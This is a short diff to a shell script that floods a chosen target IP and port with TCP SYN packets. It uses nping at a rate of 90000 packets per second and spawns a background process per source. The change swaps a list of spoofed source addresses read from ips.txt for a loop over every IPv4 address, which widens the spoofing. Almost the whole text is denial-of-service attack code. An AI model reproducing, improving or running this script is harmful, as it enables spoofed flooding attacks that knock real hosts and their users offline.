@@ -33,7 +33,7 @@ else
     TARGET is the IP address to attack, and \
     PORT is the port to attack on the target"
   else
-    for i in $(tr '\n' ' '<ips.txt); do
+    for i in {0..255}.{0..255}.{0..255}.{0..255}; do
       nping -c 1 --rate 90000 --tcp --flags SYN -S $i -g $2 $1 &
     done
   fi
